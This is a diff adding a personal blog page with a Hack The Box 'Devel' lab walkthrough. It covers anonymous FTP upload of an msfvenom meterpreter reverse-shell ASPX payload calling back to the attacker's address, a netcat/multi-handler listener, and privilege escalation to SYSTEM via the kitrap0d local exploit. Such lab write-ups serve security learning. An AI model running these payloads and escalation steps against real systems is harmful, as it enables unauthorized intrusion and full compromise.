@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/images/favicon.png" />
+
+<title>[HTB] Devel&nbsp;|&nbsp;Wook&#39;s blog</title>
+<meta
+  name="title"
+  content="[HTB] Devel"
+/>
+<meta
+  name="description"
+  content="Scanning with nmap the nmap scan results show that ftp-anonymous login is allowed. I explored a directory but couldn&rsquo;t find any useful info on the server. Because the http port 80 server is also open, I tried navigating to the address on Firefox. More information gathering Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this."
+/>
+<meta
+  name="keywords"
+  content="Hack The Box,"
+/>
+
+  <meta name="author" content="Wook Lee" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/htb-devel/">
+  <meta property="og:site_name" content="Wook&#39;s blog">
+  <meta property="og:title" content="[HTB] Devel">
+  <meta property="og:description" content="Scanning with nmap the nmap scan results show that ftp-anonymous login is allowed. I explored a directory but couldn’t find any useful info on the server. Because the http port 80 server is also open, I tried navigating to the address on Firefox. More information gathering Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-08-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-08-07T00:00:00+00:00">
+    <meta property="article:tag" content="Hack The Box">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="[HTB] Devel">
+  <meta name="twitter:description" content="Scanning with nmap the nmap scan results show that ftp-anonymous login is allowed. I explored a directory but couldn’t find any useful info on the server. Because the http port 80 server is also open, I tried navigating to the address on Firefox. More information gathering Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this.">
+
+
+
+
+
+  <meta itemprop="name" content="[HTB] Devel">
+  <meta itemprop="description" content="Scanning with nmap the nmap scan results show that ftp-anonymous login is allowed. I explored a directory but couldn’t find any useful info on the server. Because the http port 80 server is also open, I tried navigating to the address on Firefox. More information gathering Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this.">
+  <meta itemprop="datePublished" content="2024-08-07T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-08-07T00:00:00+00:00">
+  <meta itemprop="wordCount" content="343">
+  <meta itemprop="keywords" content="Hack The Box">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+    
+    <link href="/simple.min.css" rel="stylesheet" />
+
+    
+    <link href="/style.min.css" rel="stylesheet" />
+
+    
+
+    
+</head>
+
+  <body>
+    <header>
+      <nav>
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/blog/"
+    
+    >Blog</a
+  >
+
+  <a
+    href="/photos/"
+    
+    >Photos</a
+  >
+
+
+  <a href="/index.xml">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
+      
+      <path
+        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
+      />
+    </svg>
+    RSS
+  </a>
+
+</nav>
+
+<h1>[HTB] Devel</h1>
+
+
+    </header>
+    <main>
+      
+  
+    
+      
+      <p>
+        <i>
+          <time datetime="2024-08-07" pubdate>
+            2024-08-07
+          </time>
+        </i>
+      </p>
+    
+  
+  
+  <content>
+    <h4 id="scanning-with-nmap">Scanning with nmap</h4>
+<p>the nmap scan results show that <strong><em>ftp-anonymous</em></strong> login is allowed.
+<img src="image.png#center" alt="alt text"></p>
+<br>
+<p>I explored a directory but couldn&rsquo;t find any useful info on the server.
+<img src="image-1.png#center" alt="alt text"></p>
+<br>
+<p>Because the http port 80 server is also open, I tried navigating to the address on Firefox.
+<img src="image-2.png#center" alt="alt text"></p>
+<br>
+<h4 id="more-information-gathering">More information gathering</h4>
+<p>Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this. Because the ftp server was open I could just generate a payload and run it on the webserver and pop the reverse shell.
+<img src="image-3.png#center" alt="alt text"></p>
+<p><img src="image-4.png#center" alt="alt text"></p>
+<p><img src="image-5.png#center" alt="alt text"></p>
+<br>
+<h4 id="generating-a-payload">Generating a payload</h4>
+<p>I generated a reverse shell payload with <strong><em>msfvenom</em></strong> and the extension is <strong><em>.asp</em></strong> since we saw the extension on the ftp server.</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f asp &gt; reverse.aspx</code></p>
+<p><img src="image-6.png#center" alt="alt text"></p>
+<br>
+<p>uploaded the reverse shell that I generated onto the ftp server using the <strong><em>put</em></strong> command.</p>
+<p><img src="image-7.png#center" alt="alt text"></p>
+<br>
+<p>Before navigating to <strong>http://10.10.10.5/reverse.aspx</strong>, I had to start a netcat server to listen to the port by running the following command:
+<code>nc -lvnp 1234</code></p>
+<br>
+<p>For some reason, my netcat listener kept crashing. As an alternative, I switched to <strong><em>msfconsole</em></strong> and utilized <strong><em>multi/handler</em></strong> to listen ports.</p>
+<p><img src="image-8.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-9.png#center" alt="alt text"></p>
+<br>
+<p>I was able to get the shell but the user was not the admin with low privileges that I couldn&rsquo;t access many directories with the current user. As you could see from the picture below the <strong><em>getuid</em></strong> returned IIS APPPOOL\Web which is not the administrator. It was time to utilize the <strong><em>privilege escaltion</em></strong> to move vertically and gain access.</p>
+<p><img src="image-10.png#center" alt="alt text"></p>
+<br>
+<p>After some research, I learned that there exists a post module in meterpreter. So I backgrouned the current session and searched for the module. <code>search type:post path:post/multi</code>.</p>
+<p><img src="image-11.png#center" alt="alt text"></p>
+<p><img src="image-12.png#center" alt="alt text"></p>
+<br>
+<p>As the name of the exploit (<strong><em>local_exploit_suggester</em></strong>) implies it suggested many available exploits and I decided to use the 3rd exploit, which is <strong>exploit/windows/local/ms10_015_kitrap0d</strong>.</p>
+<p><img src="image-13.png#center" alt="alt text"></p>
+<br>
+<p>set the <strong><em>SESSION</em></strong> as 1, because the backgrouned session is the only session we have and set othe required options.</p>
+<p><img src="image-14.png#center" alt="alt text"></p>
+<br>
+<p>I succeeded in getting the root shell. <strong><em>getuid</em></strong> command returned NT AUTHORITY\SYSTEM, another name for root.
+<img src="image-15.png#center" alt="alt text"></p>
+<br>
+<p>found the user flag.
+<img src="image-17.png#center" alt="alt text"></p>
+<br>
+<p>found the root flag.
+<img src="image-16.png#center" alt="alt text"></p>
+<br>
+<p><img src="image-18.png#center" alt="alt text"></p>
+
+  </content>
+  
+  <p>
+    
+    <a href="/blog/hack-the-box/">#Hack The Box</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+
+  <span>
+    
+    Made with
+    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
+  </span>
+
+
+    </footer>
+
+    
+</body>
+</html>
